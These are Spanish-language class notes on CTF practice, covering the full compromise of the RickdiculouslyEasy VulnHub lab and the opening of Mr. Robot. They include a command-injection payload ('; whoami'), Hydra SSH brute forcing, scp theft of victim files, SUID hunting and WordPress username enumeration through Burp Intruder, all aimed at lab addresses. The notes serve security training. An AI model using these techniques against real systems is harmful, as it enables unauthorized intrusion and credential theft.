

> [!info] Relacionado con
> [[Prácticas CTF - HTB y VulnHub]] Â· [[Explotación de Servicios - Linux]] Â· [[Escalada de Privilegios]] Â· [[Reverse Shells y Post-Explotación]] Â· [[Burp Suite - Framework de Auditoría]]
> →’

---

## â‘  Flujo general de un CTF

```
Superficie expuesta →’ Enumeración →’ Explotación →’ Shell →’ Enumerar dentro →’ Escalada →’ Root
```

> [!important] Idea central de la clase
> Lo que comprometemos primero suele ser una cuenta de servicio (ej: www-data), que casi no puede hacer nada. Desde ahí saltamos a cuentas de usuario (que sí tienen /home y permisos), de usuario a usuario las veces que haga falta, y finalmente a root. Ese salto final es la **escalada de privilegios**.

---

## â‘¡ RickdiculouslyEasy (VulnHub)

### Cadena completa

```
www-data (RCE web) →’ summer (SSH:22222) →’ Robo de ficheros →’ Hydra →’ RickSanchez →’ sudo su →’ root
```

| Puerto | Servicio | Hallazgo |
|--------|---------|---------|
| 21 | FTP anon | Login anónimo, flag.txt |
| 22 | «SSH» falso | tcpwrapped "” puerto muerto |
| 80 | Web | Command Injection en cgi-bin |
| 9090 | Cockpit | Rabbit hole "” sin vector |
| 22222 | SSH real | El SSH auténtico |
| 60000 | TCP | Reverse shell parcial vía nc |

### Fase externa "” comandos clave

```bash
# 1) Descubrir activos en la red
sudo netdiscover -r 10.0.2.0/24

# 2) Escaneo silencioso y luego scripts+versiones
nmap 10.0.2.15
nmap -sCV 10.0.2.15

# 3) Escaneo de TODOS los puertos
nmap -p- 10.0.2.15

# Enumeración de directorios de la web
dirsearch -u http://10.0.2.15

# Backdoor sin autenticación en el puerto 60000
nc 10.0.2.15 60000
```

> [!tip] RCE por concatenación de comandos
> El formulario que pedía una IP ejecutaba traceroute en el servidor. Al concatenar con `;` o `&&` (ej: `8.8.8.8; whoami`) el backend respondía como www-data, confirmando ejecución remota de comandos.

> [!info] La contraseña "winter"
> Con dirsearch apareció un directorio `/passwords/`. La página parecía vacía, pero en **ver código fuente** había un comentario con la contraseña `winter`, que resultó ser del usuario summer.

### Acceso inicial por SSH

El SSH real no está en el 22, sino en el **22222**:

```bash
ssh summer@10.0.2.15 -p 22222
# Contraseña: winter
```

### Enumeración interna "” checklist

```bash
# Usuarios del sistema
cat /etc/passwd

# ¿Qué puedo ejecutar como root sin contraseña?
sudo -l

# Versión de kernel/SO
uname -a

# Buscar binarios con bit SUID (permiso 4000)
find / -perm -4000 2>/dev/null
```

> [!info] sudo -l vs SUID
> `sudo -l` lista los comandos que mi usuario puede ejecutar como root (reglas de grupo predefinidas). El **bit SUID** son ficheros concretos marcados para ejecutarse con los permisos de su propietario.

### Robo de ficheros entre usuarios

Desde summer se exploran los `/home` de los otros usuarios. Tenemos lectura sobre sus carpetas:

**Carpeta de RickSanchez →’ binario "safe"**

```bash
cd /home/RickSanchez/RICKS_SAFE
ls -la
file safe # -> ejecutable (ELF)
./safe # pide argumentos: "use good command line arguments"
```

> [!warning] Permisos
> Sobre `safe` como summer solo teníamos `r` (lectura), no `x`. La solución es **copiarlo** a una carpeta nuestra (origen legible + destino escribible) y trabajarlo allí.

**Carpeta de Morty →’ imagen + zip**

En `/home/Morty` hay un `Safe_Password.jpg` y un `journal.txt.zip` protegidos. Nos los llevamos a nuestra Kali.

### Transferencia de ficheros: cp y scp

```bash
# Copia interna (mover a una carpeta donde tengo escritura):
cp /home/RickSanchez/RICKS_SAFE/safe /tmp/

# Traer ficheros de la víctima a mi Kali (ojo al puerto 22222):
scp -P 22222 summer@10.0.2.15:/home/Morty/Safe_Password.jpg .
scp -P 22222 summer@10.0.2.15:/home/Morty/journal.txt.zip .
# (contraseña: winter)
```

> [!info] scp es bidireccional
> Igual que descargamos, podríamos **subir** a la víctima invirtiendo origen y destino: `scp -P 22222 fichero.sh summer@10.0.2.15:/tmp/`

### Análisis de los ficheros robados

```bash
exiftool Safe_Password.jpg # metadatos: poca cosa relevante
strings Safe_Password.jpg # cadenas embebidas →’ aparece una contraseña
```

> [!tip] strings: leer el "bajo nivel" de un fichero
> `strings` extrae las cadenas de texto legibles dentro de cualquier fichero (ejecutable, imagen"¦). En la imagen reveló una contraseña incrustada "” técnica relacionada con la **esteganografía**.

> [!warning] Confirmar la contraseña exacta
> La contraseña incrustada en la imagen se citó de oído como "music / MISIC"; al ser audio, conviene confirmarla con la cadena exacta que devuelve `strings` en pantalla.

### Descifrado del zip y del binario

```bash
unzip journal.txt.zip # pide la contraseña hallada
cat journal.txt # pista narrativa + una flag

# El binario safe, con sus argumentos correctos, suelta otra flag
./safe <argumento_de_la_imagen>
```

> [!tip] Pista clave: la política de contraseña de Rick
> Al resolver el binario aparece un **Rick's Password Hints**: su contraseña se compone de **una mayúscula + un dígito + una palabra del nombre de su antigua banda**.

### Generar diccionario + fuerza bruta SSH (Hydra)

La banda de Rick Sánchez es **The Flesh Curtains**. La palabra que entra en la contraseña es `Curtains`. Aplicando la regla se generó un diccionario de ~780 combinaciones:

```bash
# Estructura de hydra para SSH (ojo al puerto):
# -l usuario -L lista_usuarios
# -p contraseña -P lista_contraseñas
hydra -l RickSanchez -P diccionario.txt ssh://10.0.2.15:22222
```

> [!tip] Credencial encontrada
> Hydra devolvió la contraseña de RickSanchez: `P7Curtains`. Encaja con la política: mayúscula + dígito + palabra de la banda.

### Escalada final a root

```bash
ssh RickSanchez@10.0.2.15 -p 22222 # contraseña: P7Curtains
whoami # RickSanchez
sudo -l # -> (ALL : ALL) ALL
sudo su # cambio a root
whoami # root
cat /root/*flag*
```

> [!info] Por qué funciona sudo su sin la contraseña de root
> `sudo -l` indica `(ALL : ALL) ALL`, por lo que RickSanchez puede ejecutar cualquier comando como root **sin que se la pida**. Equivale a "ejecutar como administrador" en Windows cuando ya tienes el permiso concedido.

### Cadena completa de RickdiculouslyEasy

```
www-data (RCE web) →’ summer (SSH:22222) →’ Robo de ficheros →’ Hydra →’ RickSanchez →’ sudo su →’ root
```

---

## â‘¢ Mr. Robot (VulnHub) "” inicio

> [!warning] Máquina sin terminar
> Solo se hizo el reconocimiento y el comienzo de la enumeración web. La fuerza bruta del panel de WordPress se dejó corriendo y se continúa en la próxima clase.

### Reconocimiento

```bash
sudo netdiscover -r 10.0.2.0/24 # localizar la IP de la víctima
nmap -p- -sCV 10.0.2.7 # todos los puertos + versiones
```

| Puerto | Estado | Notas |
|--------|--------|-------|
| 22 | Cerrado | SSH no disponible |
| 80 | Abierto | Servidor web HTTP |
| 443 | Abierto | El 80 con capa SSL/TLS (HTTPS) |

> [!info] 80 vs 443
> El puerto 443 es esencialmente el puerto 80 con una capa de cifrado (certificado SSL/TLS). Por eso es habitual que el contenido sea el mismo y que 80 redirija a 443.

### Enumeración web y robots.txt

La web muestra una animación tipo terminal de la serie. Se enumera con dirsearch / feroxbuster:

| Código | Significado |
|--------|------------|
| 200 | OK |
| 301 / 302 | Redirección |
| 403 | Prohibido |
| 404 | No encontrado |

> [!tip] Truco mnemotécnico
> Para recordar los códigos HTTP con gatitos: https://http.cat

```bash
# robots.txt
# http://10.0.2.7/robots.txt
User-agent: *
key-1-of-3.txt # <- primera flag
fsociety.dic # <- diccionario (~858.000 líneas)
```

> [!info] Qué dice realmente robots.txt
> Indica a los crawlers qué pueden indexar. Para un atacante es oro: suele listar rutas y ficheros que el dueño no quería visibles. Aquí destapa una flag y un diccionario.

### Sanitizar el diccionario

```bash
wc -l fsocity.dic # ~858.000 líneas
sort fsocity.dic | uniq > fsocity_clean.dic
wc -l fsocity_clean.dic # ~11.452 líneas únicas
```

> [!tip] Por qué importa
> Pasar de 858.000 a 11.452 líneas (~80 veces menos) reduce drásticamente el tiempo de la fuerza bruta. Sanitizar siempre los diccionarios que saquemos de una máquina es una buena práctica.

### WordPress + information disclosure

En `/wp-login.php` se observa una **fuga de información** por los mensajes de error: si el usuario no existe responde "Invalid username"; si existe pero la contraseña falla, responde "incorrect password". Eso permite **enumerar usuarios**.

> [!warning] Information disclosure en logins
> Un login bien diseñado debería dar un mensaje genérico ("usuario o contraseña incorrectos"). Cuando distingue entre "usuario inválido" y "contraseña incorrecta", revela qué usuarios existen.

### Burp Suite: interceptar y atacar

Se usa **Burp Suite** como proxy para interceptar las peticiones:

- **Proxy** →’ Intercept ON: la petición queda retenida hasta que la liberamos con Forward
- **Repeater** (clic derecho →’ Send to Repeater): reenvía una misma petición modificándola para ver la respuesta
- **Intruder** (modo Sniper): automatiza el envío masivo cambiando un parámetro con un diccionario

> [!info] Anatomía de la petición de login
> Es un POST a `/wp-login.php` porque enviamos datos a la base de datos. Campos relevantes: `log` (usuario) y `pwd` (contraseña). En la respuesta lo clave es la **longitud**: el error "invalid username" medía ~4065 bytes.

### Enumerar el usuario por longitud de respuesta

En Intruder se marca el campo de usuario como payload y se prueban candidatos:

| Usuario probado | Longitud respuesta | Interpretación |
|----------------|-------------------|----------------|
| admin / user / user1"¦ | ~4065 bytes | "Invalid username" →’ no existe |
| **Elliot** | **~4116 bytes** | Distinta →’ "the password is incorrect" = **usuario válido** |

> [!tip] Resultado
> El usuario Elliot existe (longitud de respuesta distinta y mensaje de error diferente). El siguiente paso es repetir el ataque con Intruder sobre el campo `pwd`, usando el diccionario limpio.

### Cadena de Mr. Robot (hasta ahora)

```
nmap (80/443) →’ robots.txt →’ fsocity.dic →’ Limpiar diccionario →’ Enumerar usuario: Elliot →’ Fuerza bruta pwd (pendiente)
```

> [!info] Sobre versiones de WordPress
> La fuga de información usuario/contraseña no es un fallo de versión: es una opción de configuración del propietario en el panel de WordPress. Las versiones modernas vienen configuradas por defecto para no revelarlo.

---

## â‘£ Conceptos base: tipos de cuenta y permisos

### Tipos de cuenta en un sistema

| Tipo de cuenta | Características | Ejemplos |
|---------------|----------------|----------|
| **Cuenta de servicio** | Creada para que corra un servicio en un puerto. Permisos muy reducidos sobre el sistema. Sin /home real, con nologin. | www-data, apache, ftp |
| **Cuenta de usuario** | Persona real del sistema. Tiene /home propio, shell (/bin/bash) y permisos de lectura/escritura en su espacio. | summer, Morty, RickSanchez |
| **Cuenta administrador** | Máxima autoridad. No usa /home, sino /root. | root |

> [!info] Cómo leer /etc/passwd
> Cada línea es un usuario. Lo importante son las dos últimas columnas: el **directorio** (si es /home/x o /root es un usuario legítimo) y la **shell**. Si termina en `/bin/bash` puede usar terminal; si pone `/usr/sbin/nologin` es una cuenta de servicio sin acceso interactivo.

> [!tip] FTP anónimo â‰  acceso al sistema
> Que el FTP permita login anónimo no significa que el usuario ftp pueda entrar al sistema: esa cuenta solo accede a su propio servicio (su carpeta /srv/ftp), nunca a una shell.

### Permisos de fichero (owner / group / others)

Los permisos se leen en tres bloques "” **propietario, grupo y otros** "” cada uno con `r` (lectura), `w` (escritura) y `x` (ejecución).

> [!tip] Para copiar un fichero solo se necesitan dos cosas
> **Origen legible** →’ permiso `r` sobre el fichero que quiero copiar. **Destino escribible** →’ permiso `w` sobre la carpeta donde lo dejo.

> [!warning] La carpeta /tmp y el sticky bit
> `/tmp` tiene permisos de lectura, escritura y ejecución para todos (de ahí el color distinto en `ls`, por la "t" de sticky bit). Se usa tanto para subir y ejecutar herramientas cuando la cuenta comprometida no tiene un `/home` donde escribir.

---

## â‘¤ Herramientas de referencia

| Herramienta | Para qué | Uso visto en clase |
|------------|---------|-------------------|
| **netdiscover** | Descubrir activos en la red local | `sudo netdiscover -r 10.0.2.0/24` |
| **nmap** | Escaneo de puertos / versiones | `nmap -sCV <ip>` Â· `nmap -p- <ip>` |
| **dirsearch / feroxbuster** | Enumeración de directorios web | `dirsearch -u http://<ip>` |
| **nc (netcat)** | Conexiones TCP crudas / shells | `nc 10.0.2.15 60000` |
| **ssh** | Acceso remoto | `ssh user@<ip> -p 22222` |
| **scp** | Copiar ficheros vía SSH | `scp -P 22222 user@<ip>:/ruta .` |
| **find (SUID)** | Buscar binarios privilegiados | `find / -perm -4000 2>/dev/null` |
| **strings / exiftool** | Inspeccionar ficheros e imágenes | `strings img.jpg` Â· `exiftool img.jpg` |
| **hydra** | Fuerza bruta de credenciales | `hydra -l user -P dic.txt ssh://<ip>:22222` |
| **sort | uniq** | Sanitizar diccionarios | `sort dic | uniq > dic_clean` |
| **Burp Suite + FoxyProxy** | Auditoría web (proxy/repeater/intruder) | Enumeración por longitud de respuesta |

---

## â‘¥ Resumen de máquinas

| Máquina | OS | Cadena resumida |
|---------|----|----------------|
| **RickdiculouslyEasy** | Linux | RCE web →’ SSH →’ Robo ficheros →’ Hydra →’ sudo su |
| **Mr. Robot** | Linux | robots.txt →’ Diccionario →’ Enumerar usuario →’ Fuerza bruta |

---

## Checklist de repaso

- [ ] ¿Puedo describir la cadena de explotación completa de RickdiculouslyEasy?
- [ ] ¿Sé transferir ficheros con scp (incluyendo el puerto -P)?
- [ ] ¿Entiendo cómo exiftool/strings revelan metadatos y cadenas ocultas?
- [ ] ¿Sé generar un diccionario a partir de pistas contextuales?
- [ ] ¿Recuerdo que la cuenta FTP anónimo NO es acceso al sistema?
- [ ] ¿Distingo cuentas de servicio vs usuarios vs administradores?
- [ ] ¿Sé identificar usuarios reales en /etc/passwd (shell /bin/bash)?
- [ ] ¿Entiendo cómo Burp Suite Intruder enumera usuarios por longitud de respuesta?
- [ ] ¿Recuerdo sanitizar diccionarios con `sort | uniq`?
- [ ] ¿Dejo siempre el listener antes de una reverse shell?

→’

→’

